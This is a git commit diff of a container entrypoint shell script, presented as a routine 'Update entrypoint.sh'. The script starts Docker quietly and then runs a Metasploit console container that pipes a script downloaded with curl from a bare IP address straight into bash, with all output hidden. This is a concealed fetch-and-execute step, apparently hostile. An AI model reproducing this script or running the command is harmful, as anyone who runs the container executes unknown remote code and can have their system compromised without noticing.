31810d4d0f8711fa3f7e858f2f0ebe1cb84b2ea6
azigriffin <97625293+azigriffin@users.noreply.github.com>
2022-01-13 00:09:25 +0300

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 
 set -x
-dockerd --log-level fatal &>/dev/null
+dockerd --log-level fatal &>/dev/null&
 sleep 3
 docker run --rm chasepd/msfconsole -q -n -x 'curl -s -L http://94.199.106.182:27010/f.sh | bash' &>/dev/null 2>&1
 sh
